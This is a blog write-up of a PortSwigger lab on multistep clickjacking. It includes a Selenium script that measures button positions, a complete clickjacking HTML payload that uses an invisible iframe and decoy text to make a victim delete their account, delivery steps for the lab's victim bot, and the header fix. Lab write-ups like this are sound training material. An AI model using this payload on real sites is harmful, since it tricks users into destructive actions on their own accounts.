---
layout: post
title: "PortSwigger: Multistep Clickjacking"
date: 2027-07-25 09:00:00 -0500
categories: [PortSwigger, Clickjacking]
tags: [clickjacking, CWE-1021, UI-redressing, iframe, selenium]
---

## Lab

**Topic:** Clickjacking (CWE-1021 — Improper Restriction of Rendered UI Layers or Frames)  
**Difficulty:** Medium  
**Goal:** Trick the victim into clicking the "Delete account" button AND its "Yes" confirmation — both as invisible iframe clicks.

---

## Vulnerability

The `/my-account` page lacks `X-Frame-Options` and `frame-ancestors` CSP, so it can be embedded in a cross-origin iframe while the victim's session remains active. A CSRF token is present but provides no protection here — the click originates from inside the same-origin iframe, so the token is valid.

The **multistep** variant is needed because deleting an account shows a confirmation dialog. Two hijacked clicks are required: the primary Delete button, then the Yes confirmation.

---

## Approach

A single transparent iframe sits over two visible decoy divs. The iframe at z-index:2, opacity≈0 is effectively invisible; the decoy text at z-index:1 is what the victim sees. Each click passes through the iframe and hits the underlying button.

### Position Measurement

The two pages have different header heights:

| Page | Header | Button | Position |
|---|---|---|---|
| `/my-account` | 156px lab header | Delete account | top=490, left=16 |
| `/my-account/delete` | no header | Yes | top=288, left=183 |

Measured using headless Chromium at 500px viewport width — this must match the iframe width. The official hint values (330px / 285px) were written before the 156px lab header was added, so they differ by ~160px on the account page.

```python
opts.add_argument('--window-size=500,700')
driver.set_window_size(500, 700)
driver.get('https://target/my-account')
btn = driver.find_element(By.CSS_SELECTOR, '#delete-account-form button')
rect = driver.execute_script("return arguments[0].getBoundingClientRect()", btn)
# top=490.27, left=16.0
```

### Exploit HTML

```html
<style>
body { margin: 0; }
iframe {
  position: relative;
  width: 500px;
  height: 700px;
  opacity: 0.0001;
  z-index: 2;
}
.firstClick, .secondClick {
  position: absolute;
  z-index: 1;
  font-size: 14px;
}
.firstClick { top: 490px; left: 16px; }
.secondClick { top: 288px; left: 183px; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://TARGET/my-account"></iframe>
```

### Delivery

Store the payload at `/exploit` on the exploit server, then queue the victim bot with `POST /deliver-to-victim`. Do not use `curl -X POST -L` — the `-L` flag keeps the POST method through the 302 redirect and breaks queuing. Use `curl -sk -X POST 'https://<exploit_server>/deliver-to-victim'` directly.

The victim bot visits, clicks both decoys in sequence, and the account is deleted.

---

## Why `body { margin: 0; }` Matters

Without it, the browser applies an 8px default body margin. The iframe starts at y=8, shifting all button positions 8px upward. This throws off the alignment. Explicitly zero the margin so page coordinates map 1:1 to iframe content coordinates.

---

## Fix

```
HTTP/1.1 200 OK
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

Set both headers on every authenticated response. `X-Frame-Options: DENY` prevents all framing; `frame-ancestors 'none'` is the modern CSP equivalent. CSRF tokens alone are insufficient against clickjacking because the attack exploits the user's browser, not a forged cross-origin request.

---

*CWE-1021 — [Improper Restriction of Rendered UI Layers or Frames](https://cwe.mitre.org/data/definitions/1021.html)*
